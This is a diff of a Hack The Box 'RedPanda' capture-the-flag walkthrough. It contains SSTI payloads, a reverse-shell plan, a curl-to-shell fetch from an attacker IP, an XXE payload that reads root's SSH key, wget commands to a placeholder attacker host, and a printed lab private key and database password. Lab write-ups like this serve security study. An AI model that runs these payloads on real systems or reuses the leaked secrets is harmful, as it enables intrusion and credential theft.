@@ -1,4 +1,4 @@
-# RedPanda *INCOMPLETE*  
+# RedPanda    
 ### A demonstration walkthrough of a pen test process using HTB's RedPanda with some normal dead ends as an example.  
 
 #### Setup
@@ -20,7 +20,7 @@ nikto -h redpanda.htb:8080
 Interesting Results (NMAP):  
 - Running OpenSSH 8.2p1 and an unknown hhtp-proxy "Made by Spring Boot" in title  
 Interesting Results (NIKTO):   
-- /stats/ firectory discovered
+- /stats/ directory discovered
 - HTTP PUT and DELETE methods allowed  
 - "content-disposition" header returned    
 
@@ -55,10 +55,10 @@ ${7*7}
 ${{7*7}}
 #{7*7}
 ```
-Some of the payloads didn't work, since some of the symbols (specificly #) are blacklisted by the server.
+Some of the payloads didn't work, since some of the symbols (specifically $) are blacklisted by the server.
 
 ### Creating a RCE
-The namp scan indicated the app is powered by "Spring Boot"  
+The nmap scan indicated the app is powered by "Spring Boot"  
 Not being familar with Spring Boot, a Google found this good template [here](https://blog.hawkeyesecurity.com/2017/12/13/rce-via-spring-engine-ssti/)  
 This returns /etc/passwd
 
@@ -97,7 +97,7 @@ if __name__ == "__main__":
 `command = "cat /home/woodenk/user.txt"` provides the user flag
 
 ### Plan for escalation
-Using SSTI: 1) Upload shell script to create reverse shell.  2) Envoke shell script
+Using SSTI: 1) Upload shell script to create reverse shell.  2) Invoke shell script
 
 Host the following shell script on the attacking machine.  I prefer:  `python -m http.server 8000`
 ```
@@ -120,18 +120,20 @@ find / -name "*panda*" 2>/dev/null
 find / -name "*woodenk*" 2>/dev/null
 ```
 
-This gives us a source code directory (maybe some nice config info) and user XML files in /credits
+This gives us a source code directory (maybe some nice config info) and user XML files in /credits  
+
 ```
 cd /opt/panda_search
 find . -type f -exec grep -H 'text-to-find-here' {} \;
 ```
 
-result:
+This gives mysql connection info and 'woodenk' embedded in some images  
+
 `./src/main/java/com/panda_search/htb/panda_search/MainController.java:            conn = DriverManager.getConnection("jdbc:mysql://localhost:3306/red_panda", "woodenk", "RedPandazRule");`
 
 
-**DEAD END** Try LinPEAS to find escalation, nothing I saw at the OS level
-From github to your attecking machine (HTB machines don't resolve WWW domains)
+Try LinPEAS to find escalation  
+From github to your attacking machine (HTB machines don't resolve WWW domains)
 ```
 curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh > linpeas.sh
 ```
@@ -139,20 +141,72 @@ On target machine upload linPEAS
 ```
 curl -L http://10.10.14.2:8000/linpeas.sh | sh
 ```
+**DEAD END** nothing I saw for OS level escalation  
 
-ROOT requires XXE (Incomplete)
-https://shakuganz.com/2022/07/12/hackthebox-redpanda/
+### MySQL dump
+```
+mysqldump -u woodenk -pRedPandazRule red_panda 
+```
+This tells us the "panda" table has four fields (name, bio, imgloc, author)
 
------BEGIN OPENSSH PRIVATE KEY-----
+ROOT requires XXE (this is just crib notes)
+Full walkthrough [here](https://shakuganz.com/2022/07/12/hackthebox-redpanda/)
+
+XXE.1 Set the "artist" value in an attack image
+```
+exiftool -Artist="../tmp/gg" pe_exploit.jpg
+```
+
+XXE.2 Create `gg_creds.xml` with the following content
+```
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+   <!ELEMENT foo ANY >
+   <!ENTITY xxe SYSTEM "file:///root/.ssh/id_rsa" >]>
+<credits>
+  <author>gg</author>
+  <image>
+    <uri>/../../../../../../tmp/pe_exploit.jpg</uri>
+    <views>1</views>
+    <foo>&xxe;</foo>
+  </image>
+  <totalviews>2</totalviews>
+</credits>
+```
+
+XXE.3 upload files and modify the redpanda.log
+```
+wget 10.10.ATTACKER.IP/pe_exploit.jpg -P /tmp
+wget 10.10.ATTACKER.IP/gg_creds.jpg -P /tmp
+echo "222||a||a||/../../../../../../tmp/pe_exploit.jpg" > /opt/panda_search/redpanda.log
+```
+
+In minute or two /tmp/gg_creds.xml is updated
+```
+cat /tmp/gg_creds.xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo>
+<credits>
+  <author>gg</author>
+  <image>
+    <uri>/../../../../../../tmp/pe_exploit.jpg</uri>
+    <views>2</views>
+    <foo>-----BEGIN OPENSSH PRIVATE KEY-----
 b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
 QyNTUxOQAAACDeUNPNcNZoi+AcjZMtNbccSUcDUZ0OtGk+eas+bFezfQAAAJBRbb26UW29
 ugAAAAtzc2gtZWQyNTUxOQAAACDeUNPNcNZoi+AcjZMtNbccSUcDUZ0OtGk+eas+bFezfQ
 AAAECj9KoL1KnAlvQDz93ztNrROky2arZpP8t8UgdfLI0HvN5Q081w1miL4ByNky01txxJ
 RwNRnQ60aT55qz5sV7N9AAAADXJvb3RAcmVkcGFuZGE=
------END OPENSSH PRIVATE KEY-----
+-----END OPENSSH PRIVATE KEY-----</foo>
+  </image>
+  <totalviews>3</totalviews>
+</credits>
+```
 
+Put the `foo` element into s file `le_key.txt` and login as root
+```
 chmod 600 ./le_key.txt
 ssh root@redpanda.htb -i le_key.txt
-
+```
 
 ### ROOT SUCCESS!
